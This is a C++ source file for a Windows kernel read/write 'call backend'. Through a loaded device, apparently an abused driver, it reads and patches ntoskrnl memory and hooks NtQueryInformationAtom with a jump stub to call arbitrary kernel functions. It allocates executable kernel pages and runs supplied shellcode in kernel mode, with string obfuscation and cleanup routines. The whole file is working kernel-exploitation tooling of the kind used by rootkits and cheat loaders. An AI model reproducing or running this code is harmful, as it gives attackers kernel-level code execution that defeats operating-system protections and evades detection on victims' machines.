#include "KernelRwCallBackend.h"
#include "Clean.h"
#include <memory>


namespace
{
	uint64_t GetKernelModuleAddressByName( const char* moduleName )
	{
		if ( !moduleName )
			return 0;

		auto miSpace = r_cast<PRTL_PROCESS_MODULES>( GetSysInfo( SystemModuleInformation ) );

		if ( !miSpace )
			return 0;

		uint64_t result = 0;

		for ( ULONG i = 0; i < miSpace->NumberOfModules; i++ )
		{
			const char* fullName = r_cast<const char*>( miSpace->Modules[ i ].FullPathName );
			const char* currentName = fullName + miSpace->Modules[ i ].OffsetToFileName;

			if ( !_stricmp( currentName, moduleName ) )
			{
				result = r_cast<uint64_t>( miSpace->Modules[ i ].ImageBase );
				break;
			}
		}

		RtlFreeHeap( NtCurrentPeb( )->ProcessHeap, 0, miSpace );

		return result;
	}

	bool PatternMatches( const uint8_t* data, const uint8_t* pattern, const char* mask )
	{
		for ( auto i = 0u; mask[ i ]; ++i )
		{
			if ( mask[ i ] != '?' && data[ i ] != pattern[ i ] )
				return false;
		}

		return true;
	}
}

NTSTATUS KernelRwCallBackend::Load( )
{
	auto status = LoadDevice( );

	if ( status != STATUS_SUCCESS )
		return status;

	m_Ntoskrnl = GetKernelModuleAddressByName( pstra( "ntoskrnl.exe" ) );

	if ( !m_Ntoskrnl )
		return 0x9110;

	return STATUS_SUCCESS;
}

NTSTATUS KernelRwCallBackend::Unload( )
{
	return UnloadDevice( );
}

bool KernelRwCallBackend::Clean( )
{
	return KernelClean::RunAllCleanups( *this );

	//return false;
}

void KernelRwCallBackend::SetAllocationMode( KernelAllocationMode mode )
{
	m_AllocationMode = mode;
}

NTSTATUS KernelRwCallBackend::Execute( uint8_t* shellCode, uint32_t codeSize )
{
	if ( !shellCode || !codeSize )
		return STATUS_INVALID_PARAMETER;

	const auto useIndependentPages = m_AllocationMode == KernelAllocationMode::IndependentPages;
	const auto kernelShell = useIndependentPages ? AllocIndependentPages( codeSize ) : AllocatePool( NonPagedPool, codeSize );

	if ( !kernelShell )
	{
		LOG_SEC( "[-] - [%s] Failed to allocate kernel shell buffer", Name( ) );
		return 0x9120;
	}

	if ( !WriteMemory( kernelShell, shellCode, codeSize ) )
	{
		LOG_SEC( "[-] - [%s] Failed to write kernel shell buffer", Name( ) );

		if ( useIndependentPages )
			FreeIndependentPages( kernelShell, codeSize );
		else
			FreePool( kernelShell );

		return 0x9121;
	}

	NTSTATUS result = 0;

	if ( !CallKernelFunction( &result, kernelShell ) )
	{
		LOG_SEC( "[-] - [%s] Failed to execute kernel shell buffer", Name( ) );
		result = 0x9122;
	}

	if ( useIndependentPages )
		FreeIndependentPages( kernelShell, codeSize );
	else
		FreePool( kernelShell );

	return result;
}

bool KernelRwCallBackend::WriteToReadOnlyMemory( uint64_t address, const void* buffer, size_t size )
{
	return WriteMemory( address, buffer, size );
}

bool KernelRwCallBackend::PrepareKernelCall( uint64_t kernelFunctionAddress, void** userFunction, uint64_t* restoreAddress, uint8_t* originalBytes, size_t* originalSize )
{
	if ( !userFunction || !restoreAddress || !originalBytes || !originalSize )
		return false;

	const auto ntdll = LoadLibraryW( pstrw( L"ntdll.dll" ) );

	if ( !ntdll )
		return false;

	*userFunction = r_cast<void*>( GetProcAddress( ntdll, pstra( "NtQueryInformationAtom" ) ) );

	if ( !*userFunction )
	{
		LOG_SEC( "[-] - [%s] Failed to resolve ntdll!NtQueryInformationAtom", Name( ) );
		return false;
	}

	const auto kernelNtQueryInformationAtom = GetKernelModuleExport( m_Ntoskrnl, pstra( "NtQueryInformationAtom" ) );

	if ( !kernelNtQueryInformationAtom )
	{
		LOG_SEC( "[-] - [%s] Failed to resolve nt!NtQueryInformationAtom", Name( ) );
		return false;
	}

	uint8_t jumpStub[] = { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };
	memcpy( jumpStub + 2, &kernelFunctionAddress, sizeof( kernelFunctionAddress ) );

	if ( !ReadMemory( kernelNtQueryInformationAtom, originalBytes, sizeof( jumpStub ) ) )
	{
		LOG_SEC( "[-] - [%s] Failed to read nt!NtQueryInformationAtom", Name( ) );
		return false;
	}

	if ( !WriteToReadOnlyMemory( kernelNtQueryInformationAtom, jumpStub, sizeof( jumpStub ) ) )
	{
		LOG_SEC( "[-] - [%s] Failed to patch nt!NtQueryInformationAtom", Name( ) );
		return false;
	}

	*restoreAddress = kernelNtQueryInformationAtom;
	*originalSize = sizeof( jumpStub );
	return true;
}

bool KernelRwCallBackend::RestoreKernelCall( uint64_t restoreAddress, const uint8_t* originalBytes, size_t originalSize )
{
	if ( !restoreAddress || !originalBytes || !originalSize )
		return false;

	if ( !WriteToReadOnlyMemory( restoreAddress, originalBytes, originalSize ) )
	{
		LOG_SEC( "[-] - [%s] Failed to restore kernel call gate", Name( ) );
		return false;
	}

	return true;
}

uint64_t KernelRwCallBackend::GetKernelModuleExport( uint64_t kernelModuleBase, const char* functionName )
{
	if ( !kernelModuleBase || !functionName )
	{
		LOG_SEC( "[-] - [%s] GetKernelModuleExport: invalid parameter module=0x%llx export=%p", Name( ), kernelModuleBase, functionName );
		return 0;
	}

	IMAGE_DOS_HEADER dosHeader {};
	IMAGE_NT_HEADERS64 ntHeaders {};

	if ( !ReadMemory( kernelModuleBase, &dosHeader, sizeof( dosHeader ) ) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE )
	{
		LOG_SEC( "[-] - [%s] GetKernelModuleExport(%s): DOS header failed module=0x%llx magic=0x%X", Name( ), functionName, kernelModuleBase, dosHeader.e_magic );
		return 0;
	}

	if ( !ReadMemory( kernelModuleBase + dosHeader.e_lfanew, &ntHeaders, sizeof( ntHeaders ) ) || ntHeaders.Signature != IMAGE_NT_SIGNATURE )
	{
		LOG_SEC( "[-] - [%s] GetKernelModuleExport(%s): NT header failed module=0x%llx e_lfanew=0x%X signature=0x%X", Name( ), functionName, kernelModuleBase, dosHeader.e_lfanew, ntHeaders.Signature );
		return 0;
	}

	const auto exportBase = ntHeaders.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
	const auto exportSize = ntHeaders.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;

	if ( !exportBase || !exportSize )
	{
		LOG_SEC( "[-] - [%s] GetKernelModuleExport(%s): export directory missing module=0x%llx exportBase=0x%X exportSize=0x%X", Name( ), functionName, kernelModuleBase, exportBase, exportSize );
		return 0;
	}

	auto exportData = std::make_unique<uint8_t[ ]>( exportSize );

	if ( !ReadMemory( kernelModuleBase + exportBase, exportData.get( ), exportSize ) )
	{
		LOG_SEC( "[-] - [%s] GetKernelModuleExport(%s): failed to read export directory at 0x%llx size=0x%X", Name( ), functionName, kernelModuleBase + exportBase, exportSize );
		return 0;
	}

	auto exports = r_cast<PIMAGE_EXPORT_DIRECTORY>( exportData.get( ) );
	const auto delta = r_cast<uint64_t>( exportData.get( ) ) - exportBase;
	auto nameTable = r_cast<uint32_t*>( exports->AddressOfNames + delta );
	auto ordinalTable = r_cast<uint16_t*>( exports->AddressOfNameOrdinals + delta );
	auto functionTable = r_cast<uint32_t*>( exports->AddressOfFunctions + delta );

	for ( auto i = 0u; i < exports->NumberOfNames; ++i )
	{
		const auto currentName = r_cast<char*>( nameTable[ i ] + delta );

		if ( _stricmp( currentName, functionName ) )
			continue;

		const auto ordinal = ordinalTable[ i ];

		if ( functionTable[ ordinal ] <= 0x1000 )
		{
			LOG_SEC( "[-] - [%s] GetKernelModuleExport(%s): invalid function RVA ordinal=%u rva=0x%X", Name( ), functionName, ordinal, functionTable[ ordinal ] );
			return 0;
		}

		const auto functionAddress = kernelModuleBase + functionTable[ ordinal ];

		if ( functionAddress >= kernelModuleBase + exportBase && functionAddress <= kernelModuleBase + exportBase + exportSize )
		{
			LOG_SEC( "[-] - [%s] GetKernelModuleExport(%s): forwarded export unsupported ordinal=%u function=0x%llx", Name( ), functionName, ordinal, functionAddress );
			return 0;
		}

		//LOG_SEC( "[+] - [%s] GetKernelModuleExport(%s): resolved 0x%llx ordinal=%u rva=0x%X", Name( ), functionName, functionAddress, ordinal, functionTable[ ordinal ] );
		return functionAddress;
	}

	LOG_SEC( "[-] - [%s] GetKernelModuleExport(%s): export name not found", Name( ), functionName );
	return 0;
}

uint64_t KernelRwCallBackend::AllocatePool( POOL_TYPE poolType, uint64_t size )
{
	if ( !size )
		return 0;

	const auto exAllocatePoolWithTag = GetKernelModuleExport( m_Ntoskrnl, pstra( "ExAllocatePoolWithTag" ) );

	LOG_SEC( "[*] - [%s] ExAllocatePoolWithTag: 0x%llx", Name( ), exAllocatePoolWithTag );

	if ( !exAllocatePoolWithTag )
		return 0;

	uint64_t allocatedPool = 0;

	if ( !CallKernelFunction( &allocatedPool, exAllocatePoolWithTag, poolType, size, 'pMuR' ) )
		return 0;

	return allocatedPool;
}

bool KernelRwCallBackend::FreePool( uint64_t address )
{
	if ( !address )
		return false;

	const auto exFreePool = GetKernelModuleExport( m_Ntoskrnl, pstra( "ExFreePool" ) );

	if ( !exFreePool )
		return false;

	return CallKernelFunction<void>( nullptr, exFreePool, address );
}

uint64_t KernelRwCallBackend::AllocIndependentPages( uint32_t size )
{
	const auto base = MmAllocateIndependentPagesEx( size );

	if ( !base )
	{
		LOG_SEC( "[-] - [%s] Error allocating independent pages", Name( ) );
		return 0;
	}

	if ( !MmSetPageProtection( base, size, PAGE_EXECUTE_READWRITE ) )
	{
		LOG_SEC( "[-] - [%s] Failed to change independent pages protections", Name( ) );
		FreeIndependentPages( base, size );
		return 0;
	}

	LOG_SEC( "[+] - [%s] Independent pages allocated at 0x%llx size=0x%X", Name( ), base, size );
	return base;
}

uint64_t KernelRwCallBackend::MmAllocateIndependentPagesEx( uint32_t size )
{
	if ( !size )
		return 0;

	if ( !m_MmAllocateIndependentPagesEx )
	{
		// 41 8B D6 B9 00 10 00 00 E8 ?? ?? ?? ?? 48 8B D8
		auto callInstruction = FindPatternInSection( pstra( ".text" ), m_Ntoskrnl, 
			"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8", 
			pstra( "xxxxxxxxx????xxx" ) );

		if ( !callInstruction )
		{
			LOG_SEC( "[-] - [%s] Failed to find MmAllocateIndependentPagesEx pattern", Name( ) );
			return 0;
		}

		callInstruction += 8;
		m_MmAllocateIndependentPagesEx = ResolveRelativeAddress( callInstruction, 1, 5 );

		if ( !m_MmAllocateIndependentPagesEx )
		{
			LOG_SEC( "[-] - [%s] Failed to resolve MmAllocateIndependentPagesEx", Name( ) );
			return 0;
		}

		LOG_SEC( "[+] - [%s] MmAllocateIndependentPagesEx 0x%llx", Name( ), m_MmAllocateIndependentPagesEx );
	}

	uint64_t allocatedPages = 0;

	if ( !CallKernelFunction( &allocatedPages, m_MmAllocateIndependentPagesEx, size, -1, 0, 0 ) )
		return 0;

	return allocatedPages;
}

bool KernelRwCallBackend::FreeIndependentPages( uint64_t address, uint32_t size )
{
	if ( !address || !size )
		return false;

	if ( !m_MmFreeIndependentPages )
	{
		// BA 00 60 00 00 48 8B CB E8 ?? ?? ?? ?? 48 8D 8B 00 F0 FF FF
		auto callInstruction = FindPatternInSection( pstra( "PAGE" ), 
			m_Ntoskrnl, 
			"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF", 
			pstra( "xxxxxxxxx????xxxxxxx" ) );

		if ( !callInstruction )
		{
			LOG_SEC( "[-] - [%s] Failed to find MmFreeIndependentPages pattern", Name( ) );
			return false;
		}

		callInstruction += 8;
		m_MmFreeIndependentPages = ResolveRelativeAddress( callInstruction, 1, 5 );

		if ( !m_MmFreeIndependentPages )
		{
			LOG_SEC( "[-] - [%s] Failed to resolve MmFreeIndependentPages", Name( ) );
			return false;
		}

		LOG_SEC( "[+] - [%s] MmFreeIndependentPages 0x%llx", Name( ), m_MmFreeIndependentPages );
	}

	uint64_t result = 0;
	return CallKernelFunction( &result, m_MmFreeIndependentPages, address, size );
}

bool KernelRwCallBackend::MmSetPageProtection( uint64_t address, uint32_t size, ULONG protect )
{
	if ( !address || !size )
	{
		LOG_SEC( "[-] - [%s] Invalid address/size passed to MmSetPageProtection", Name( ) );
		return false;
	}

	if ( !m_MmSetPageProtection )
	{
		// 0F 45 ?? ?? 8D ?? ?? ?? FF FF E8
		auto callInstruction = FindPatternInSection( pstra( "PAGELK" ), m_Ntoskrnl, 
			"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8", pstra( "xx??x???xxx" ) );

		if ( callInstruction )
			callInstruction += 10;
		else
		{
			// 0F 45 ?? ?? 45 8B ?? ?? ?? ?? 8D ?? ?? ?? ?? ?? ?? FF FF E8
			auto match = FindPatternInSection( pstra( "PAGELK" ), m_Ntoskrnl, 
				"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8", pstra( "xx??xx????x??????xxx" ) );

			if ( !match ) {
				// 0F 45 D8 E8 ? ? ? ? 84 DB 74 ? 48 8B CE
				match = FindPatternInSection( pstra( "PAGELK" ), m_Ntoskrnl,
					"\x0F\x45\xD8\xE8\x00\x00\x00\x00\x84\xDB\x74\x00\x48\x8B\xCE", pstra( "xxxx????xxx?xxx" ) );
			}

			if ( !match ) {
				// BF 00 10 00 00 8B D7 E8
				match = FindPatternInSection( pstra( ".text" ), m_Ntoskrnl,
					"\xBF\x00\x10\x00\x00\x8B\xD7\xE8", pstra( "xxxxxxxx" ) );
			}

			if ( match )
				callInstruction = FindCallInRange( match, 0x30 );
		}

		if ( !callInstruction )
		{
			LOG_SEC( "[-] - [%s] Failed to find MmSetPageProtection pattern", Name( ) );
			return false;
		}

		m_MmSetPageProtection = ResolveRelativeAddress( callInstruction, 1, 5 );

		if ( !m_MmSetPageProtection )
		{
			LOG_SEC( "[-] - [%s] Failed to resolve MmSetPageProtection", Name( ) );
			return false;
		}

		LOG_SEC( "[+] - [%s] MmSetPageProtection 0x%llx", Name( ), m_MmSetPageProtection );
	}

	BOOLEAN setProtectStatus = FALSE;

	if ( !CallKernelFunction( &setProtectStatus, m_MmSetPageProtection, address, size, protect ) )
		return false;

	return setProtectStatus != FALSE;
}

uint64_t KernelRwCallBackend::ResolveRelativeAddress( uint64_t instruction, ULONG offsetOffset, ULONG instructionSize )
{
	LONG ripOffset = 0;

	if ( !ReadMemory( instruction + offsetOffset, &ripOffset, sizeof( ripOffset ) ) )
		return 0;

	return instruction + instructionSize + ripOffset;
}

uint64_t KernelRwCallBackend::FindSection( const char* sectionName, uint64_t moduleBase, ULONG* sectionSize )
{
	if ( !sectionName || !moduleBase )
		return 0;

	uint8_t headers[ 0x1000 ] {};

	if ( !ReadMemory( moduleBase, headers, sizeof( headers ) ) )
	{
		LOG_SEC( "[-] - [%s] Failed to read module headers 0x%llx", Name( ), moduleBase );
		return 0;
	}

	const auto dosHeader = r_cast<PIMAGE_DOS_HEADER>( headers );

	if ( dosHeader->e_magic != IMAGE_DOS_SIGNATURE )
		return 0;

	const auto ntHeaders = r_cast<PIMAGE_NT_HEADERS64>( headers + dosHeader->e_lfanew );

	if ( ntHeaders->Signature != IMAGE_NT_SIGNATURE )
		return 0;

	auto section = IMAGE_FIRST_SECTION( ntHeaders );

	for ( WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section )
	{
		char currentName[ IMAGE_SIZEOF_SHORT_NAME + 1 ] {};
		memcpy( currentName, section->Name, IMAGE_SIZEOF_SHORT_NAME );

		if ( strcmp( currentName, sectionName ) )
			continue;

		const auto size = section->Misc.VirtualSize ? section->Misc.VirtualSize : section->SizeOfRawData;

		if ( sectionSize )
			*sectionSize = size;

		return moduleBase + section->VirtualAddress;
	}

	return 0;
}

uint64_t KernelRwCallBackend::FindPattern( uint64_t address, size_t size, const char* pattern, const char* mask )
{
	if ( !address || !size || !pattern || !mask )
		return 0;

	const auto maskLength = strlen( mask );

	if ( !maskLength || size < maskLength )
		return 0;

	auto data = std::make_unique<uint8_t[ ]>( size );

	if ( !ReadMemory( address, data.get( ), size ) )
	{
		LOG_SEC( "[-] - [%s] FindPattern read failed address=0x%llx size=0x%llx", Name( ), address, size );
		return 0;
	}

	for ( size_t i = 0; i <= size - maskLength; ++i )
	{
		if ( PatternMatches( data.get( ) + i, (uint8_t*)pattern, mask ) )
			return address + i;
	}

	return 0;
}

uint64_t KernelRwCallBackend::FindPatternInSection( const char* sectionName, uint64_t moduleBase, const char* pattern, const char* mask )
{
	ULONG sectionSize = 0;
	const auto section = FindSection( sectionName, moduleBase, &sectionSize );

	if ( !section || !sectionSize )
		return 0;

	return FindPattern( section, sectionSize, pattern, mask );
}

bool KernelRwCallBackend::FindPatternInSectionAll( const char* sectionName, uint64_t moduleBase, const char* pattern, const char* mask, uint64_t* results, size_t maxResults, size_t* resultCount )
{
	if ( resultCount )
		*resultCount = 0;

	if ( !results || !maxResults || !resultCount || !pattern || !mask )
		return false;

	ULONG sectionSize = 0;
	const auto section = FindSection( sectionName, moduleBase, &sectionSize );

	if ( !section || !sectionSize )
		return false;

	const auto maskLength = strlen( mask );

	if ( !maskLength || sectionSize < maskLength )
		return false;

	auto data = std::make_unique<uint8_t[ ]>( sectionSize );

	if ( !ReadMemory( section, data.get( ), sectionSize ) )
	{
		LOG_SEC( "[-] - [%s] FindPatternInSectionAll read failed section=%s address=0x%llx size=0x%X", Name( ), sectionName, section, sectionSize );
		return false;
	}

	for ( size_t i = 0; i <= sectionSize - maskLength && *resultCount < maxResults; ++i )
	{
		if ( !PatternMatches( data.get( ) + i, (const uint8_t*)pattern, mask ) )
			continue;

		results[ *resultCount ] = section + i;
		++( *resultCount );
	}

	return *resultCount != 0;
}

uint64_t KernelRwCallBackend::FindCallInRange( uint64_t address, size_t size )
{
	if ( !address || !size )
		return 0;

	auto data = std::make_unique<uint8_t[ ]>( size );

	if ( !ReadMemory( address, data.get( ), size ) )
		return 0;

	for ( size_t i = 0; i < size; ++i )
	{
		if ( data[ i ] == 0xE8 )
			return address + i;
	}

	return 0;
}
